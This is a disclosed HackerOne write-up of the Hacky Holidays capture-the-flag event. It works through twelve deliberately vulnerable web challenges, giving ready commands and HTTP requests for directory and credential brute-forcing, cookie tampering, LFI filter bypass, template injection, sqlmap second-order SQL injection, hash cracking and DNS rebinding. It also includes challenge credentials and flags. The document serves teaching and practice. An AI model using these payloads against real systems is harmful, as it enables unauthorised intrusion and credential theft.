---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/uncontrolled-resource-consumption
  - env/web
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2021-01-12
submitted: 2020-12-27T17:48:22.151Z
bounty_usd: null
votes: 2
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "yso"
source: "https://hackerone.com/reports/1067090"
title: "Mission completed. Grinch Networks is down and Christmas saved."
---
# Mission completed. Grinch Networks is down and Christmas saved.

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 2 | **Program:** h1-ctf | **Disclosed:** 2021-01-12

- Report: [https://hackerone.com/reports/1067090](https://hackerone.com/reports/1067090)
- CWE: Uncontrolled Resource Consumption
- Submitted: 2020-12-27T17:48:22.151Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi, I decided to create a good writeup, but for that I'd need some time, that's why I am submitting this pre-report now, and the actual report I ll submit before the deadline in this thread, right under this one.

Here is some proof that Grinch Networks is down:
hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709
flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

Stay tuned!

## Impact

Critical

## Timeline

- **Report Filed**
- **2020-12-31** @yso: # Executive Summary:
This year Mr Grinch has gone hi-tech and decided to ruin our Christmas, but thanks to a threat intelligence team we have got to know his intentions and therefore we put up a special Incident Response team just for this case. After a couple of days of hard work, the IR team successfully infiltrated his network and took him down just right on Christmas eve. 

# Technical Summary:
During the assessment IR team identified and exploited the following weaknesses and vulnerabilities:
1. Information Disclosure through files for web crawlers
2. Information Disclosure through javascript files
3. Insecure direct object reference
4. Information Disclosure due to lack of Authentication control
5. User Enumeration and Password Enumeration due to descriptive messages. Weak credentials
6. Source code exposure. Weak filter bypass that leads to PHP LFI.
7. Directory listing and SSTI
8. Source code leakage with secrets through an open git repository. Weak password usage.
9. Second-order SQL Injection
10. Source code exposure through developer comments. Insecure usage of functions that leads to overflow and thus arbitrary user creation with administrator privileges.
11. Double SQL Injection and Path Traversal
12. Insecure cryptographic salt usage. The predictive  algorithm used. DNS Rebinding attack


# Detailed explanation of issues and walk through:

## 1.  Information Disclosure through files for web crawlers
The default web crawler files like robots.txt or humans.txt sometimes may contain valuable to attackers information (e.g. hidden directories, which are difficult to brute force).
### Steps to reproduce
  * Launch the following command            
```
~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 80 -x txt,php
```
  * In the output you should be able to find robots.txt
  * Open a browser and navigate to the following link https://hackyholidays.h1ctf.com/robots.txt
{F1140069}

### Key takeaways
In the real world, it is not an issue on its own and would definitely need a context in order to be a valid security issue. It might be used in a chain of vulnerabilities/missing of best practices and weaknesses.

## 2.  Information Disclosure through javascript files
Sometimes developers modify legacy Javascript code for debugging purposes, but they tend to forget to remove it before the release. The issue sometimes may lead to information disclosure of sensitive content, the same as it was in our story. IR team followed the hidden link `/s3cr3t-ar3a` and discovered that `assets/js/jquery.min.js` was modified and it contained the code that printed sensitive flag in the HTML document.
### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/s3cr3t-ar3a
  * Press Ctrl+U . HTML source code should be shown. 
  * Now find a script `/assets/js/jquery.min.js`
  * Download the script using this command `wget https://hackyholidays.h1ctf.com/assets/js/jquery.min.js`
  * unminify the js code by using this command: `js-beautify -o jquery.js jquery.min.js`
  * Look at the first 50 lines of the file: `head -n 50 jquery.js`
  * Find references to h1_0, h1_2 variables. After analysing this piece of code we understand that we have to look for `alertbox` on the page using developer tools. Alternatively, we can change JS code a bit and execute it in order to get the flag,
  * Navigate to https://hackyholidays.h1ctf.com/s3cr3t-ar3a again
  * Open Developer Tools by pressing Ctrl+Schift+I 
  * Click on Inspector on the Developer Tools toolbar, and try to search for `#alertbox`
  * We should be able to find our flag data-info parameter. 

{F1140070}

### Supporting Material/References:

### Key takeaways
In the real world, it is pretty common to find and analyze JS files, especially those which are custom. A tool such as js-beautify and a mindset for finding interesting or strange code is essential for such weaknesses. 

## 3. Insecure direct object reference
After navigating to https://hackyholidays.h1ctf.com/apps, which was a hinted location in the JS file at the second stage, we find eight different buttons. Each button is a link to another mini-app that IR team had to crack during the hunt for a secret area portal. The first target was people-rater mini-app. 

After navigating to https://hackyholidays.h1ctf.com/people-rater , IR Team intercepted two GET requests. One of them was representing `/people-rater/page/1` and the second one was `people-rater/entry?id=eyJpZCI6Mn0=`. The first endpoint was returning JSON file with a list of `{"id":"base64_encoded_value", name:"Name"}`. Then the Team had to enumerate each page by increasing and decreasing the number in the request. Thanks to that it became evident that `/people-rater/page/1` is the first page. 

Secondly, IRT decoded the first base64 encoded value `eyJpZCI6Mn0=` , which contained `{"id":2}`. After that the logic was simple - we had to send a base64 encoded value of  `{"id":1}` to `people-rater/entry?id=` 

### Steps to reproduce
  * Set up a proxy like Burp Suite or ZAP
  * Navigate to https://hackyholidays.h1ctf.com/people-rater
  * Go to the Burp Suite. Find the request to `/people-rater/page/0`
{F1140071}
  * Base64 decode `eyJpZCI6Mn0=`. You should get `{"id":2}`
{F1140072}
  * Decrease the id by 1 and base64 encode it. You should get `eyJpZCI6MX0=`
  * Now send a GET request to https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=
{F1140073}

### Key takeaways
Always look into each parameter and assume something may be hidden

## 4. Information Disclosure due to lack of Authentication control
As always, the first step was to study the app itself. The app had an interesting functionality that s
et a `token` cookie when the user entered a valid username and password that led us to look into
how we could sing in.

The default endpoint bruteforce gave us a few endpoints, such as `/api/purchase` and `/api/sessions`. But in order to discover all endpoints a negative status code filter should have been used. This interesting technique gave us another endpoint - `/api/user`, which returned a 400 error.

The `/api/sessions` endpoint returned a list of sessions, where only one was interesting. And thanks
to what we discovered before, we knew that it should be used inside a `token` cookie.

But it wasn't the end, so that's why we decided to brute-force parameters on `/api/user`, and that gav
e us an `uuid` parameter, the same parameter which was found in session, so all we had to do in order
 to get a flag is to send a request to `/api/user` endpoint with a session token in a cookie and a parameter `uuid` which value was taken from the session token.

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/swag-shop
  * Find request to api endpoints and initiate a scan of the api endpoint. (don't forget to change the directory)

```
~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/swag-shop/api/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 60 -b 404
```

{F1140075}
  * Got to the Burp Suite, do a request to swag-shop/api/user

```
GET /swag-shop/api/user HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1GET
```

  * Then bruteforce a parameter on /swag-shop/api/user endpoint

```
wfuzz --hc 400 -w ~/Tools/lists/SecLists/Discovery/Web-Content/burp-parameter-names.txt https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=1
```

   * Do a GET request to swag-shop/api/sessions  and find a list of sessions. copy the third one (the longest)

```
eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==
```

{F1140076}
   * Decode the longest session token. It should decode to 

```
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```
   * The place a token to a Cookie header `Cookie: token=[TOKEN]` and copy UUID from the token and place it into `uuid` parameter. Send the request.

```
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==
Referer: https://hackyholidays.h1ctf.com/apps
Upgrade-Insecure-Requests: 1
```

{F1140077}

### Supporting Material/References:

### Key takeaways
Sometimes one should fuzz using a negative match, not just a default setup.


## 5. User Enumeration and Password Enumeration due to descriptive messages. Weak credential
This app had a strange error saying `Invalid Username`, when we tried to login, that's why we decided
 to bruteforce the usernames and hope that the app would return another descriptive error for a passo
word. Here it should be noted that mostly everyone fell in a trap by not assuming that `Invalid Usern
ame` and `Invalid Password` have the same length.

Indeed it if you bruteforce by first filtering out `Invalid Username` and thenfiltering out `Invalid
Password` - you get `access:computer`.

After successfully signing in, the server issued a `securelogin` cookie that contained a base64 encod
ed value of a cookie parameter and admin parameter, which was set to false. Apperently, no checks wer
e implemented, and just by changing `"admin":false` to `"admin":true` did the trick and we became an
admin.

On the admin page we found a zip file accessible for download. Unfortunately it was password protecte
d, but a tool like `zip2john` helped to get a hash of the password ready for a bruteforce using `john
`. The password is easy - `hahahaha`. Using it, we unzipped a zip file and got a flag.


### Steps to reproduce
  * Navigate to  and send a login request using username: user and password pass. Observe a descriptive error `Invalid Username`
  * Start a username brute-force attack. You should get a username: access

```
wfuzz -u https://hackyholidays.h1ctf.com/secure-login -w ~/Tools/lists/SecLists/Usernames/Names/names.txt -d 'username=FUZZ&password=pass' --hs 'Invalid\ Username'
```

{F1140086}
  * Go to the login page in the browser again and send a login request using username: access and password pass. Observe a descriptive error `Invalid Password`
  * Start a password brute-force attack. You should get a password: computer

```
wfuzz -u https://hackyholidays.h1ctf.com/secure-login -w ~/Tools/lists/SecLists/Passwords/Common-Credentials/10k-most-common.txt -d 'username=access&password=FUZZ' --hs 'Invalid\ Password'
```

  * Intercept requests using Burp Suite, go the login page and authenticate youself using `access` as a username and `computer` as a password.
  * Send that request to Repeater and send it to the host again. You should get a redirect with setting a cookie

```
Set-Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D;
```

  * URL- and base64- decode the cookie and you should get

```
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```

  * Change admin parameter to `true`, url- and base64- decode the cookie. After that send a GET request to /secure-login with the new cookie.

```
GET /secure-login HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackyholidays.h1ctf.com/secure-login
Connection: close
Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3d%3d
Upgrade-Insecure-Requests: 1

```

{F1140085}
  * In the Response you can find a link to `/my_secure_files_not_for_you.zip` file
  * Grab ZIP file - https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip
  * If you try to open with the old password - you'll fail. So we have to use `john2zip` in order to create a hash, that we will brute

```
~/Tools/john/run/zip2john my_secure_files_not_for_you.zip > encrypted.zip.hash
```

  * Then execute the actual brute-force command

```
~/Tools/john/run/john encrypted.zip.hash --wordlist=/home/strawberry/Tools/lists/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

  * The password that you'll get is - `hahahah`. Use it to open either using GUI or using this command

```
unzip unzip my_secure_files_not_for_you.zip
```

  * cat the flag.txt. Note it's better not to see xxx.png file)
{F1140084}

### Supporting Material/References:

### Key takeaways
Sometimes the grep is better than checking just the size, because the error could be the same length as what you are trying to filter out.

## 6. Source code exposure. Weak filter bypass that leads to PHP LFI.
After opening an app, we saw a template parameter setting `entries.html`. The endpoint bruteforce showed us that the app is written in php, and the file that is being executed as default is `index.php`.
That led us to an idea to include `index.php` in `template` parameter, which gave us its source-code.

After studying a source-code, I discovered that there are `admin.php` and `secretadmin.php` files tha
t are our targets. Also there are checks implemented, but truth to say they are weak, e.g. `str_repla
ce` function that replaces only the first occurance with the empty string, so that `admadmin.php.php` will become `admin.php`

Following that way, I constructed a payload - `secretadminsecretadadmin.phpmin.php.php` that resulted
 into `secretadmin.php` after all replacements. That way we included a `secretadmin.php` source code
and got our flag

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/my-diary
  * Notice template parameter and change it to index.php e.g. https://hackyholidays.h1ctf.com/my-diary/?template=index.php (You should get code of index.php)
{F1140087}
  * Read the code, understand the logic
  * Construct a payload that bypasses protections.
  * Send a request with the payload - https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadadmin.phpmin.php.php
{F1140088}
  * Get the flag

### Supporting Material/References:

### Key takeaways
Never use one-time replacing function, where you need recursion.

## 7. Directory listing and SSTI
Hate-mail-generator is some campaign creation mini app, that has an example, that was created for us. The example contains template braces like `{{name}}`, which is replaced by `Bob` in preview mode. Al
so an example has `{{template:cbdj3_grinch_header.html}}`, which is being replace by HTML code found
in this template.

Bruteforcing directories gave us a `/templates` directory. Directory listing on this directory gave us a new template `38dhs_admins_only_header.html`, but unfortunately the tempalate is not accessible directly.

But thanks to Mr Grinch, because he left us an ability to create and preview our own campaigns. After
 intercepting the request we saw that `preview_data` parameter is being supplied with `preview_markup
`, where preview_data contained a json with the keys and values that are reflected in the campaign me
ssage.

This all led us to injection of a template `{{template:38dhs_admins_only_header.html}}` as the value
of `name` key in `preview_data`, also where `preview_markup` was including `{{name}}`. That way we tr
icked an application to firstly fetch the template code and secondly reflect it in our variable.

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/hate-mail-generator
  * Start a brute force of directories (you should find templates directory.

```
~/go/bin/gobuster https://hackyholidays.h1ctf.com/hate-mail-generator/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 40
```

{F1140092}
  * Click on `Guess What` (https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030)     
{F1140090}
  * Look at the markup, copy this part `{{template:cbdj3_grinch_header.html}}`
{F1140091}
  * Go back. And click on `Create New` (https://hackyholidays.h1ctf.com/hate-mail-generator/new)
  * Set up a Burp Suite Proxy.
  * Enter a name, subject and add our copied markup. Click on `preview`
  * Intercept the request and send it to repeater. Notice preview_data parameter which decodes to `{"name":"Alice","email":"alice@test.com"}`
  * Go to https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ and copy 38dhs_admins_only_header.html
  * In Repeater change preview_data parameter content to `{"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}`
  * Send a new request

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 210
Origin: https://hackyholidays.h1ctf.com
Connection: close
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Upgrade-Insecure-Requests: 1

preview_markup=Hello+%7B%7Bname%7D%7D+....+%7B%7Btemplate%3Acbdj3_grinch_header.html%7D%7D&preview_data=%7B%22name%22%3A%22{{template:38dhs_admins_only_header.html}}%22%2C%22email%22%3A%22alice%40test.com%22%7D
```

{F1140093}
  *  Get your flag

### Supporting Material/References:

### Key takeaways
Always try different injection points, like preview_markup and preview_data, not just one

## 8. Source code leakage with secrets through open git repository. Weak password usage.
The next task was solved with some luck, as I had to ask help from Google, by googling `grinch networks forum` and clicking on a 5th link, which redirected me to the github page of a creater of this CTF
. The strange thing was, that the `forum` repository was open, but wasn't listed in repository column
, only that it was the last repository to which adamtlangley created a commit.

I cloned the repository, and used `git` tool to look through the history of commits. One commit was s
uspicious - `small fix`. After scrolling a bit I found credentials `forum` as username and `6HgeAZ0qC9T6CQIqJpD` as password.

The credentials were used on `/phpmyadmin` endpoint, which then led to getting md5 hash of grinch pas
sword. Bruteforcing the password locally with the help of hashcat gave nothing, but I decided to chec
k the hash using online service, that have much bigger hash:password collections than I do. And indee
d, using crackstation.net, cmd5.ru or another service gave a passowrd - `BahHumbug`.

Logging into grinch account gives us powers to look into secret messages and grab the flag.

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/forum
  * Brute-force directories. It should find an interesting `phpmyadmin` directory

```
~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/forum/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 40
```

  * Look for `grinch networks forum` in Google
{F1140101}
  * Navigate to the fifth result - https://github.com/adamtlangley
  * If we study the first page, we'll notice `Grinch-Networks/forum` repository
  * Clone the repository, check history of commits and look into an interesting commit

```
git clone https://github.com/Grinch-Networks/forum
cd forum
git log
git log -p -2
```

{F1140102}
  * After scrolling down, you should find a line with credentials `self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );`
  * Use credentials to authenticate yourself on `phpmyadmin` endpoint
  * Click on `forum`, then on `user` . (https://hackyholidays.h1ctf.com/forum/phpmyadmin/?db=forum&table=user)  

{F1140103}
  * Copy the hash of Mr Grinch. `35D652126CA1706B59DB02C93E0C9FBF`
  * Use online service like crackstation.net to find a clear-text password. The password is - `BahHumbug`
  * Now login to `grinch` account using password `BahHumbug` using the first login page - https://hackyholidays.h1ctf.com/forum/login
{F1140104}
  * Navigate to https://hackyholidays.h1ctf.com/forum/3/2
{F1140105}
  * Get the flag

### Supporting Material/References:

### Key takeaways
Close repositories and delete history! If you attack, then look for open repos and look at commit history.

## 9. Second-order SQL Injection
Evil-quiz was pretty easy. In order to prove that we have a SQL Injection I had to create 2 different accounts, the first name was `admin"` and the second name was `admin'`. After submiting a quiz we we
re redirected to the score page, where in the first case we had at least 1 user with the same name, a
nd in the second case we always had 0 users with the same name. Even after I create another user with
 a name `admin'` - the number didn't change, it was still 0.

That meant, that the application was quering a database for usernames like the one we supplied and co
unting them. The query failed and the resulting number was 0.

In order to exploit this second-order SQL Injection we had to make sqlmap differentiate between what's a true answer and what's not, because the size of the response doesn't change. `--regexp` argument
helped us to match all values that didn't match `There is 0 other player(s) with the same name as you
!`, but matched the same line with different number like 1,5,242, etc.

Then it was just a matter of time when we get the credentials. After we got them, we just logged in and got a flag.

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/evil-quiz
  * Set name to `admin"`, finish the quiz and note the answer on a score page.

```
There is 1 other player(s) with the same name as you!
```

{F1140108}
  * Navigate to https://hackyholidays.h1ctf.com/evil-quiz again
  * Set name to `admin'`, finish the quiz and note the answer on a score page.

```
There is 0 other player(s) with the same name as you!
```

{F1140109}
{F1140110}
  * As it's definitely a second order sql injection we would like to check it and dump DB quickly. For that intercept 2 requests (POST to /evil-quiz with name parameter and GET to /evil-quiz/score)  and save them to files first.req, second.req 

first.req

```
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: https://hackyholidays.h1ctf.com
Connection: close
Cookie: session=b4d9476eed4279882950934fdad25595;
Referer: https://hackyholidays.h1ctf.com/evil-quiz
Upgrade-Insecure-Requests: 1

name=admin*

```

second.req

```
GET /evil-quiz/score HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: https://hackyholidays.h1ctf.com
Connection: close
Referer: https://hackyholidays.h1ctf.com/evil-quiz/start
Cookie: session=b4d9476eed4279882950934fdad25595;
Upgrade-Insecure-Requests: 1

```

  * Now send use this sqlmap command. Answers to questions - Y,Y,N,N

```
sudo sqlmap -r first.req --second-req second.req --regexp='There is [0-9]*[1-9][0-9]* other player\(s\)' 
```

  * Now dump a table with admin and password

```
sudo sqlmap -r first.req --second-req second.req --regexp='There is [0-9]*[1-9][0-9]* other player\(s\)' -D quiz -T admin --dbms=mysql --dump
```

```
| id | username | password          |
+----+----------+-------------------+
| 1  | admin    | S3creT_p4ssw0rd-$ |
+----+----------+-------------------+
```

{F1140112}
  * Login to https://hackyholidays.h1ctf.com/evil-quiz/admin using found credentials
  * Get the flag

### Supporting Material/References:

### Key takeaways
Look for strange behaviour and check it twice with different accounts.

## 10. Source code exposure through developer comments. Insecure usage of functions that leads to overflow and thus arbitrary user creation with administrator privilege
The signup-manager was different from other apps, in a way that we had to study source-code, that we
got because of the developer comment in html file.

It was clear, that all we had to do is to overflow some part of the string in order to add at least o
ne character to it and set the last character of `lastname` as `Y`. That way, we would become an admin user.

All parameters were interesting, but the password and token are md5 hashes and we cannot change their character length. username, lastname and firstname are being checked and only first 15 characters ar
e taken from them. But there is an `age` parameter that isn't being stripped into 15 character, but r
ather it's checked whether it is numeric, whether it's more than 3 characters and is casted into an i
nteger value.

The function that are being used are `is_numeric` and `intval`. After reading their documentation it'
s clear that we can supply characters in different notation, e.g. in scientific one, so that our valu
e would bypass `is_numeric` and `strlen` check, but would casted in much bigger integer by `intval`.

That's why we supplied 1e3 which is 1*10^3 = 1000 as the value of age argument. And that's how we got
 a flag, and got to know about a new endpoint - `/r3c0n_server_4fdk59`

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/signup-manager/
  * Look at HTML source code. Ctrl+U . Find a comment with README.md
{F1140113}
  * Download a readme file https://hackyholidays.h1ctf.com/signup-manager/README.md
  * Read the file. Download and unzip https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip

```
wget https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip
unzip signupmanager.zip
```

  * You'll have to analyze the source code.     
{F1140114}
  * The most interesting and right part of the source code is:

```
if (!is_numeric($_POST["age"])) {
       $errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
       $errors[] = 'Age entered is too long';
}
$age = intval($_POST["age"]);

```

  * After reading the docs, we notice that there are insufficient checks implemented:
https://www.php.net/manual/en/function.is-numeric.php
https://www.php.net/manual/en/function.intval.php
  * We are able to send a number in a scientific notation like `1e3` (means 1*10^3), that helps us to bypass the check on more than 3 characters and set admin privileges for ourselves.
  * Send the following POST request to the target

```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 137
Origin: https://hackyholidays.h1ctf.com
Connection: close
Referer: https://hackyholidays.h1ctf.com/signup-manager/
Upgrade-Insecure-Requests: 1

action=signup&username=username_urqxn&password=pass&age=1e3&firstname=YYYYYYYYYYYYYYYYYYYYYYYYYYYY&lastname=YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
```

{F1140115}
  * The application will set a `token`. If it's not set automatically, copy it and set it manually and send another request

```
GET /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: token=9e9354b6c3a1f5e7686813daf14ac4b5;
Origin: https://hackyholidays.h1ctf.com
Connection: close
Referer: https://hackyholidays.h1ctf.com/signup-manager/
Upgrade-Insecure-Requests: 1

```

{F1140116}
  * Get the flag and discover a new endpoint - `/r3c0n_server_4fdk59`

### Key takeaways
Search for developer comments. Read the documentation of functions.

## 11 Double SQL Injection and Path traversal
Recon server was a bit hard due to it's rather new technique for me. Firstly I found a SQL Injection in a hash parameter of `/album` endpoint, but it didn't give much at first. Only after I decided to c
heck other parts of an app, I found that there is another endpoint - `/picture` that fetches a images
 from `/uploads` directory. The value of a parameter used in picture endpoint is b64 encoded and cont
ains a path and an auth md5 token, which is being checked and just changing the path value gives noth
ing.

The default page said that an API is being developed, and after finding an `/api` endpoint and trying
 to bruteforce further it became evident that only an app can access them.

It's not possible to forge an auth token ourselves, it's not possible to get at least an image direct
ly, that's why I thought on how we could make the app forge the path for us. That's when I decided to
 fuzz the sql injection again, and as a result I discovered a second sql injection, an internal one,
that changed the path and if done right signed with auth token. In that way we could do a path traver
sal attack.

Thanks to a path traversal and auth forging, we were able to bruteforce an api endpoint and find a fe
w of them, where one was really interesting - `user`, brute forcing parameters gave us `username` and
 `password`. After that I fuzzed them, and found that they act like a `LIKE` operator and by submitin
g `%` we match any character, any substring of any length, so that we can brute force and get a usern
ame and password.

The username and password should be used on `/attack-box` endpoint.

### Steps to reproduce
  * Navigate to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/
  * Start bruteforcing directories (you'll find api endpoint)

```
~/go/bin/gobuster dir -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/ -w ~/Tools/lists/dirbuster/directory-list-2.3-medium.txt -t 40
```

  * Find SQL Injection in `hash` parameter https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k
  * Start the sqlmap 

```
sudo sqlmap -u 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'
```

  * Notice that this endpoint accesses 
  * After enumerating, fuzzing and assuming that this was a subquery it was possible to inject the second injection. 
  * Download a script that fuzzes API endpoints and parameters - {F1140133}
  * launch API endpoint brute-force 

```
python3 double_sql.py -w ~/Tools/lists/SecLists/Discovery/Web-Content/common.txt --postfix ?s=1 -s 404
```
    
{F1140120}
  * launch parameter brute-force

```
python3 double_sql.py -w ~/Tools/lists/SecLists/Discovery/Web-Content/common.txt --prefix user? --postfix =1 -s 404,400
```
    
{F1140121}   
  * download {F1140136} and launch username enumeration (launch for each character) result - `grinchadmin` 

```
python3 double_sql.py -w characters.txt -s 400 --prefix user?username=g --postfix % -s 204
python3 double_sql.py -w characters.txt -s 400 --prefix user?username=grinch --postfix % -s 204
```

  * launch password enumeration (launch for each character) result - `s4nt4sucks`

```
python3 double_sql.py -w characters.txt -s 400 --prefix 'user?username=grinchadmin&password=' --postfix % -s 204
python3 double_sql.py -w characters.txt -s 400 --prefix 'user?username=grinchadmin&password=s4nt' --postfix % -s 204
```
  
{F1140122}
  * Navigate to hackyholidays.h1ctf.com/attack-box/ and use credentials `grinchadmin` and `s4nt4sucks` to sign in   
{F1140123}
  * Take the flag
### Supporting Material/References:

### Key takeaways
Always fuzz

## 12. Insecure cryptographic salt usage. Predictive algorithm used. DNS Rebinding attack
Attack box, the last app, that we had to crack. After logging in with the credentials we found before
, we explored the functionality and I saw that Mr Grinch was doing a DDoS attack on a couple IPs. Our
 mission was to take him down, so what we needed is to change the IP to his.

The `launch` endpoint had a `payload` parameter with a base64 encoded value containing target argumen
t (IP) and a hash, a sign that checked whether the payload was forged or not.

Firstly we had to forge our payloads, and I decided to check different hash algorithms like `md5(salt + pass)`, `md5(pass + salt)` or even `md5(mdt(pass)+salt)`. The script found that the salt was `mrgr
inch463`. From now on, we could supply any IP to the attack box.

I couldn't find Mr Grinch IP addresses, but thought that we could take out attack boxes by DDoSing `127.0.0.1`, but there is a check that stops an attack on the localhost. Sending different payloads, li
ke an integer representation of an IP, or cname won't work, because the check does a `dig` lookup for
 an ip, and checks whether it is an internal one.

In order to bypass that check I remembered about a DNS Rebinding attack, where the host changed the IP address after getting the first resolve (or by any other algorithm). There are a couple of services that helps us to do this type of attack, but I stopped on `https://lock.cmpxchg8b.com/rebinder.html`
. For the attack I developed a script that would create links for us.

